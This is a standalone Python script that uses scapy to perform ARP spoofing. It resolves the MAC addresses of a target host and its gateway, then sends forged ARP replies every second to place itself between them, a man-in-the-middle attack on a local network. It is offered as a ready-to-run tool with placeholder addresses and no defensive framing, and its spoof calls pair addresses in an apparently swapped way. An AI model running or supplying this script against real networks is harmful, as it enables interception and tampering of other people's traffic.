import scapy.all as scapy
import time

gateway_ip = "TARGET_ROUTER"
target_ip = "TARGET_IP"


def spoof(target_ip, target_mac, spoof_ip):
    spoof_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
    scapy.send(spoof_packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, _empty_ = scapy.srp(arp_request, timeout=3, verbose=False)
    if reply:
        return reply[0][1].src
    else:
        return None


target_mac = None
while not target_mac:
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for {target_ip}. Retrying...")
gateway_mac = None
while not gateway_mac:
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"Could not find MAC address for {gateway_ip}. Retrying...")
try:
    while True:
        spoof(target_ip=gateway_ip, target_mac=target_mac, spoof_ip=target_ip)
        spoof(target_ip=target_ip, target_mac=gateway_mac, spoof_ip=gateway_ip)
        time.sleep(1)
        print("spoofed")
except KeyboardInterrupt:
    print("stopped")
